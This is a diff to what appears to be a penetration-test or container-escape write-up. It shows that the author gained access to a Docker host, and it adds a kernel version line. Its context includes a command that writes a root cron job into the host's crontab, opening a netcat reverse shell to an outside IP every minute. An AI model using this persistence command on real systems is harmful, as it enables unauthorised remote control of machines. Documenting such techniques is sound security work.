@@ -46,7 +46,9 @@ An alternative to the above if you wanted to get straight into a shell would be 
 
 `echo "* * * * * root nc 1.2.3.4 555 -e /bin/sh" >> /host/etc/crontab`
 
-We can now run docker commands, and can even execute commands to be run within the containers e.g. `docker exec -it <container id> bash>` to get a shell for that container. I don't have more images/logs of this unfortunately.
+We can now run docker commands, and can even execute commands to be run within the containers e.g. `docker exec -it <container id> bash>` to get a shell for that container.
+
+`Linux ip-172-16-4-85 4.4.0-139-generic #165-Ubuntu SMP Wed Oct 24 10:58:50 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux`
 
 ![docker containers](../docker_containers.png)
 
